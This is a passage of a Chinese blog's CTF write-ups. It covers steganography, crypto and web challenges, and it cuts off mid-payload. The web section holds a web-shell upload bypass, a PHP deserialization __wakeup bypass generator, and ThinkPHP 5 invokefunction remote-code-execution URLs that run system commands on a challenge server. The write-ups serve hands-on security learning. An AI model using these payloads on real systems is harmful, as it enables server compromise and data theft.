dog</h2><p>这个没什么绕的，就是一个新知识，aaencode解密<br>在线网站——🔑<a href="https://www.qtool.net/decode">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200706184303704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h2><p>图片好像是没有隐藏文件的，所以先放着，看文件夹里的文件。<br>找到HTML，看源码<br><img src="https://img-blog.csdnimg.cn/2020070622394779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个是base32编码，就进行解密得到<br><img src="https://img-blog.csdnimg.cn/20200706224050743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是，这个不对。是个假的flag。还是要去看图片。’<br>图片现在能想到的就是只有LSB隐写了。<br><img src="https://img-blog.csdnimg.cn/20200706224310552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>是DES加密，看一个大佬的博客说是<code>U2FsdGVkX1</code>开头的加密基本都是DES加密。然而需要密码。<br>刚得到的假flag就是密码，看wp的时候也要仔细啊，DES和3DES也是不一样的。害我刚试了好多遍怎么都解不出来，就是不认真的结果。<br><img src="https://img-blog.csdnimg.cn/20200706230527886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_20,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="2020网鼎杯朱雀组——九宫格"><a href="#2020网鼎杯朱雀组——九宫格" class="headerlink" title="2020网鼎杯朱雀组——九宫格"></a>2020网鼎杯朱雀组——九宫格</h2><p>emmm，脚本题<br>思路：先用二维码扫描工具进行扫描，试了几个发现都是zero或者one，猜想应该是二进制什么的。这个图片很多，需要用到脚本了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zxing<span class="token keyword">import</span> osfilepath <span class="token operator">=</span> <span class="token string">r"#QRcode文件夹所在的绝对路径#"</span>l <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>l<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    reader <span class="token operator">=</span> zxing<span class="token punctuation">.</span>BarCodeReader<span class="token punctuation">(</span><span class="token punctuation">)</span>    barcode <span class="token operator">=</span> reader<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>filepath<span class="token operator">+</span><span class="token string">"\\"</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>barcode<span class="token punctuation">.</span>parsed<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>barcode<span class="token punctuation">.</span>parsed <span class="token operator">==</span> <span class="token string">'zero'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token string">'1'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200707211108475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>上面用到一个第三方库需要自己安装zxing，简单的直接使用pip安装就行。<br>然后二进制转文本，找个在线网站转一下，然后是rabbit加密<br>呃呃呃呃，不过我好像没有看到有提示，，，，百度的wp都说有提示，这道题是我在CTFhub上做的，没发现提示，然后找到个师傅的wp说是九宫格有关的，还是直接附上博客地址叭。<a href="https://www.cnblogs.com/peri0d/p/12910910.html">参考博客</a><br>然后得到flag，看过之后觉得这个需要有点脑洞的的。</p><p>本题总结：脚本比较慢，可以加上多线程，😂学的浅，目前还不会改脚本，不过多线程的确可以提快很多。还有就是这个好像是有个工具可以批量扫描二维码的，我看wp的时候有个师傅的图是批量转换的，没用脚本。不过没找到这个工具。</p><h2 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h2><p>解压，得到压缩包，再次解压，有密码，爆破得到密码，解压，无果。010editor查看，发现伪加密。(或者ZipCenOp,.jar清除伪加密，使用方法请百度。)解压得到脚本，记事本打开是python脚本。python2的，需要用2的版本进行运行。运行后发现是一堆掩码(查过百度后知道的),格式是<code>??????????.??</code>用ARCHPR进行掩码破解，参数设置百度找了好久没找到，还是自己摸索摸索。<br><img src="https://img-blog.csdnimg.cn/20200707232946147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这样，攻击类型选择掩码，设置一下掩码选项(P:最近眼神有点不好使，总看错东西，这个是没有看到)<br>进行破解就行，数字有点大，破解的有点慢。密码：<code>1558080832.15</code><br>解压得到flag<br><img src="https://img-blog.csdnimg.cn/20200707233211438.png" alt="m0re" loading="lazy"></p><h2 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h2><p>图片，没有备注什么的，先foremost分离一下，看到两张图片，都是三明治，emmm有点不一样的，一张图里面藏了两张图。010editor看看，搜索图片位置，连接处好像有段编码。<br><img src="https://img-blog.csdnimg.cn/20200707234124920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>像是base32，解码得到flag</p><h2 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h2><p>呃呃呃，原本没看懂啥意思，原来是需要将电脑上的日期改为发行日期就行了。也就是改成2020.9.17<br>其他没什么可说的</p><h2 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h2><p>听起来是按键音吧，之前做过这样的题，是按键音的。工具是dtmf2，下载地址可参考我之前写的博客——(CTF题记——再战GK、BUU)，或者自行百度<br><img src="https://img-blog.csdnimg.cn/20200707235816413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后根据九键键盘对照一下<br><img src="https://img-blog.csdnimg.cn/20200708000441363.png" alt="m0re" loading="lazy"><br>😂出题人还挺花心的，这么多girlfriend</p><h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p>第一步：foremost<br>第二步：010editor<br>第三部：stegsolve<br>全都没发现任何信息😂<br><img src="https://img-blog.csdnimg.cn/20200708134037366.png" alt="m0re" loading="lazy"><br>然后仔细看图片内容，发现是摩斯密码，可以直接写出来。<br><img src="https://img-blog.csdnimg.cn/20200708134258595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就是flag了。挺简单一道题给想多了。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NCTF2019-Keyboard"><a href="#NCTF2019-Keyboard" class="headerlink" title="[NCTF2019]Keyboard"></a>[NCTF2019]Keyboard</h2><p>键盘密码</p><pre class="language-css" data-language="css"><code class="language-css">ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</code></pre><p>可以看出这些字母都是在键盘上的最上面那一行的。而且再往上看，是数字。一个字母对应一个数字。<code>0-9</code>，然后又是这种格式的，明显是在九键键盘上再进行解题。比第一个<code>o=9，第九个键的第三个是y</code><br><img src="https://img-blog.csdnimg.cn/2020070812283615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后用脚本继续解</p><pre class="language-python" data-language="python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">'ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee'</span>s <span class="token operator">=</span> <span class="token string">' qwertyuiop'</span>d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token string">'def'</span><span class="token punctuation">,</span> <span class="token string">'ghi'</span><span class="token punctuation">,</span> <span class="token string">'jkl'</span><span class="token punctuation">,</span> <span class="token string">'mno'</span><span class="token punctuation">,</span> <span class="token string">'pqrs'</span><span class="token punctuation">,</span> <span class="token string">'tuv'</span><span class="token punctuation">,</span> <span class="token string">'wxyz'</span><span class="token punctuation">]</span><span class="token keyword">for</span> part <span class="token keyword">in</span> cipher<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(part)</span>    count <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span>    num <span class="token operator">=</span> s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>part<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">[</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>解出是</p><pre class="language-html" data-language="html"><code class="language-html">youaresosmartthatthisisjustapieceofcake</code></pre><p>加上flag就行了。</p><p>总结：看到键盘密码必须要想到两种键盘，并且数字字母之间的关系要多理解。</p><h2 id="GXYCTF2019-CheckIn"><a href="#GXYCTF2019-CheckIn" class="headerlink" title="[GXYCTF2019]CheckIn"></a>[GXYCTF2019]CheckIn</h2><p>题目只有一串base64编码</p><pre class="language-html" data-language="html"><code class="language-html">dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</code></pre><p>解出来是一串乱码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">v</span><span class="token punctuation">)</span>*L*_F<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token punctuation">&#125;</span>@H<span class="token operator"><span class="token file-descriptor important">0</span>></span>F49023@FE0<span class="token comment">#@EN</span></code></pre><p>然后就是各种密码，猜……凯撒，解不出来。<br>不知所措，Google一下大佬的wp，是rot47<br><img src="https://img-blog.csdnimg.cn/2020071015525096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>这，，，怎么没有想到rot的其他加密，害脑洞太小。<br>思考：很乱的字符串，特别是有<code>*</code>、<code>#</code>、<code>@</code>等字符，优先考虑移位的密码。rot家族的其他成员不能忘了。</p><p>这周就这吧，不写了。玩游戏放松放松去。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————暑假计划第二周</title>
      <link href="/posts/ed112f6c/"/>
      <url>/posts/ed112f6c/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>攻防世界web进阶<br>打开环境，是个上传的界面，猜想应该有过滤条件，看看源码有没有什么提示。<br><img src="https://img-blog.csdnimg.cn/20200713104748486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>好像是只能传图片，目前看到的信息只匹配后缀，但是其他的过滤，他没有说，一步一步来，先传一个正常的图片试试，<br><img src="https://img-blog.csdnimg.cn/20200713105138434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以访问到，然后就可以开始做题了。<br>先来简单的，写个一句话，然后将文件后缀改为<code>shell.jpg</code>通过抓包修改后缀，<br><img src="https://img-blog.csdnimg.cn/20200713111347604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20200713111527281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>找到了<code>flag.php</code>查看得到flag。这个是比较简单的那个上传，只过滤了后缀。<img src="https://img-blog.csdnimg.cn/20200713111925658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>攻防世界web进阶<br>php反序列化知识点，<br>审计代码，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code></pre><p>注意到<code>fl4g.php</code>，然后还需要注意的是下面的限制条件，看到了正则匹配。<br>编写代码，生成对象的序列化，然后进行base64编码，使用get方式提交请求。<br>代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'O:4'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'O:+4'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">':1:'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>正则<br><img src="https://img-blog.csdnimg.cn/20200713134231138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以，要用<code>+4</code>来代替<code>4</code><br>运行得到payload，然后进行提交就可以得到flag了。<br><img src="https://img-blog.csdnimg.cn/20200713131014965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>攻防世界web进阶<br>开启环境是这样的，也没有其他的提示，源码没什么信息，所以百度找了wp查看大佬的思路。<br><img src="https://img-blog.csdnimg.cn/20200713134405299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>emmm，了解一下这个公开漏洞去。<br>找到一份环境的源码：🍖<a href="https://github.com/vulnspy/thinkphp-5.1.29">https://github.com/vulnspy/thinkphp-5.1.29</a><br>主要代码：<code>html\thinkphp\library\think\Request.php</code><br><img src="https://img-blog.csdnimg.cn/20200713140605864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="more" loading="lazy"><br>ThinkPHP用于处理HTTP请求的Request类中，其中的method方法用于获取当前的请求类型。<br>以后学到docker了自己搭一个玩玩。总得来说有点迷，以后复现一下漏洞可能会好一点。<br>直接看大佬的解题姿势;<br>payload1</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://220.249.52.133:30775/?s<span class="token operator">=</span>/index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>phpinfo<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>-1</code></pre><p><img src="https://img-blog.csdnimg.cn/20200713141708354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以查看到phpinfo，漏洞是一个命令执行漏洞，所以可以有多种做法。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami</code></pre><p>可以执行一些终端命令，所以可以慢慢找flag，这个是一种。<br>使用ls命令一级一级向上查，</p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls</code></pre><p><img src="https://img-blog.csdnimg.cn/20200713142159768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看上一级</p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls%20<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/</code></pre><p>找到了flag文件<br><img src="https://img-blog.csdnimg.cn/20200713142437691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看这个文件使用cat命令，当然对linux命令熟悉的也可以使用其他的，像more这样，应该都可以的。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat%20<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag</code></pre><p>就可以看到flag了。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>直接查看到flag，find命令查找flag的位置<br><code>find / -name &quot;*flag*&quot;</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>find%20/%20-name%20%22*flag*%22%</code></pre><p>呃呃呃，查出来的还真不少<br><img src="https://img-blog.csdnimg.cn/20200713143145432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>最后一个<br>然后直接cat对应的flag文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/<span class="token punctuation">\</span>think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token 